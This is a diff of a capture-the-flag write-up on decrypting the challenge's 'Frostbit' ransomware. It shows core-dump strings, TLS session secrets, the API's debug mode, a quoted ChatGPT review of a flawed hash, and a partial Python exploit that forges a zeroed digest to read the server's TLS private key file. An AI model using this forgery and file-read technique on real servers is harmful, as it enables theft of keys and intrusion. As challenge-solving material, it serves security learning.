@@ -17,22 +17,31 @@ weight = 3
 | Dusty Giftwrap | The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use. |
 | Dusty Giftwrap | I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes. |
 
-
-
 ## IOC's
+
+There are a lot of information available in the ZIP archive. Here I have tried to collect relevant and interesting artefacts found during my investigation. These might come in handy later. 
 
 ### IOC's from frostbit_core_dump.13
 
 #### Endpoints
 
+Running this command to find interesting http artefacts: 
+
 ```bash
 strings frostbit_core_dump.13 | grep http
-    https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
-    https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
-    https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
+```
+
+Artefacts found: 
+
+```
+https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
+https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
+https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
 ```
 
 ##### Ransomware note
+
+Visiting the urls found from the previous command, I found something interesting: 
 
 ```html
 https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
@@ -40,9 +49,7 @@ https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e
 
 ![Ransomeware note](/images/act3/act3-frostbit-decrypt-1.png)
 
-Links in screenshot verified to not be working.
-
-In addition, from the hints (or conversations) it was mentioned a certain debug mode, which can be enabled by adding a "debug" GET parameter equals to 1: 
+Links in screenshot verified to not be working. In addition, from the hints (or conversations) it was mentioned a certain debug mode, which can be enabled by adding a "debug" GET parameter equals to 1: 
 
 ```
 https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0&debug=1
@@ -59,7 +66,7 @@ Toying with various parameters gives different results, in this case removing on
 }
 ```
 
-I notice a reference to a Python file I have found already using a Google Dork. Further, toying with the "Fgcse2IEk5zg3BhQhlL" part of the URL yields this error:
+I notice a reference to a Python file. Further, toying with the "Fgcse2IEk5zg3BhQhlL" part of the URL yielded this error:
 
 ```json
 {
@@ -68,7 +75,7 @@ I notice a reference to a Python file I have found already using a Google Dork. 
 }
 ```
 
-And the UUID part (15d977db-9fa9-48f8-be38-d36c2e21b12d):
+And toying with the UUID part (15d977db-9fa9-48f8-be38-d36c2e21b12d):
 
 ```json
 {
@@ -80,6 +87,8 @@ And the UUID part (15d977db-9fa9-48f8-be38-d36c2e21b12d):
 
 ##### Nonce
 
+Apparently there is an endpoint to retrieve the session nonce:
+
 ```html
 https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
     
@@ -90,6 +99,8 @@ https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
 
 ##### Invalid API Path
 
+This one came broken out of the box, or I had just used it wrong: 
+
 ```html
 https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
     {
@@ -99,11 +110,13 @@ https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
 
 #### Encrypted key JSON
 
+Taking a look closer for any nonces in the core dump:
+
 ```bash
 strings frostbit_core_dump.13 -n 10 | grep -i nonce
 ```
 
-Output:
+I found a JSON structure with two keys, "encryptedKey" and "nonce". Nonce part was empty, but there was a hex string in the "encryptedKey" field:
 
 ```json
 {"encryptedkey":"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f","nonce":""}
@@ -119,6 +132,8 @@ strings frostbit_core_dump.13 -n50
 
 #### Unrecognized JSON 1
 
+Some random JSON output from what looked like a HTTP request:
+
 ```json
 {"digest":"10044402b080a8example202088819b8","status":"Key Set","statusid":"ZGTw7qlexampleQNiW"}
 {"digest":"0081c004828085c081a0e424db82a0a0","status":"Key Set","statusid":"Fgcse2IEk5zg3BhQhlL"}
@@ -127,11 +142,15 @@ strings frostbit_core_dump.13 -n50
 
 #### Long HEX text
 
+Appears to be the same for the JSON reply with the "encryptedKey" field: 
+
 ```hex
 2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f
 ```
 
 #### Client and Server handshakes and secrets 
+
+These values when put into a text file and referenced in "(Pre)-Master-Secret log filename", will decode the TLS entries in the associated PCAP.
 
 ```
 CLIENT_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 95d29ae475a8cca66237ae742e80ef054694f1cac76005718eda63098ea1ed54
@@ -140,11 +159,9 @@ CLIENT_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2
 SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 784b9c051b6ed71221f367cc790ac1b1c8dd70dd8690c69f01262745bf61cd78
 ```
 
-{{% notice note %}}
-These values when put into a text file and referenced in "(Pre)-Master-Secret log filename", will decode the TLS entries in the associated PCAP.
-{{% /notice %}}
-
 #### POST request for key
+
+Found this POST request: 
 
 ```http
 POST /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key HTTP/1.1
@@ -275,12 +292,37 @@ Appears this path might be important: ```/etc/nginx/certs/api.frostbit.app.key``
 
 ## Solution
 
+This objective only has a Gold solution since there were no Silvers given (or available).
+
 ### Gold
+
+For this one I had to reach out to the community. It was quickly established that the artefacts of importance were:
+
+* Code file: FrostBiteHashlib.py
+* URL: https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
+* Debug mode: debug=1 on the above URL
+
+Since this objective hints so heavily towards that Python file, I decided to upload it to ChatGPT and ask if there were any flaws within it. It suggested there was a flaw in the "_compute_hash" method:
+
+> The flaw in the `_compute_hash` function lies in how it combines the file bytes, filename bytes, and nonce bytes to generate the hash. Specifically:
+>
+>1. **Inconsistent Mixing Logic**: The function first processes the file bytes using a simple XOR operation with the nonce, but then when it processes the filename bytes, it uses a different approach, applying a bitwise AND operation between the nonce and filename bytes. This inconsistency in how the operations are applied makes the function behave unpredictably, especially when handling different input data.
+>
+>2. **Overwriting Data in Hash**: The function relies on a `count` variable and uses modular arithmetic to determine where to place the result of each operation into the `hash_result` byte array. This can lead to overwriting values within `hash_result`, especially since the hash length might be smaller than the combined length of the file and filename data. As a result, important information might be lost or masked by previous calculations.
+>
+>3. **Non-deterministic Results**: The modular arithmetic used for indexing can lead to non-deterministic results when the inputs (file, filename, nonce) are slightly modified. A good hash function should produce a consistent and unique result for every unique input, but the current method may not reliably produce distinct results for different data, especially when the size of the data being hashed changes.
+>
+>In essence, the function mixes the data in an inconsistent and potentially destructive way, which makes it unsuitable for generating unique, reliable hashes.
+
+By this took a closer look at the code and found out that computes an all zeroed hash if xrd == 0, meaning if ```hash_result[count_mod]``` is AND-ed with 0, then the outcome will be 0. It dawned upon me after talking on Discord that we are trying to retrie the "/etc/nginx/certs/api.frostbit.app.key" file.  
+
+Thinking much over it, I came up with the following code: 
 
 ```python
 import requests
 import urllib.parse
 
+# Nonce as Bytes list. The nonce is repeated twice to ensure cyclic overwriting of the hash
 nonce = bytes([
     0xe9,
     0x98,
@@ -311,6 +353,11 @@ print(url)
 print(res.text)
 ```
 
+To explain the code, let's take a first look at how the URL is built up:
+
+```
+https://api.frostbit.app/view/{PATH_A}/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
+```
 Which gave an URL 
 
 ```
@@ -401,5 +448,5 @@ Appears to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it
 
 ![Cyberched decode](/images/act3/act3-frostbit-decrypt-7.png)
 
-Answer: Xena Xtreme
+**Answer:** Xena Xtreme
 
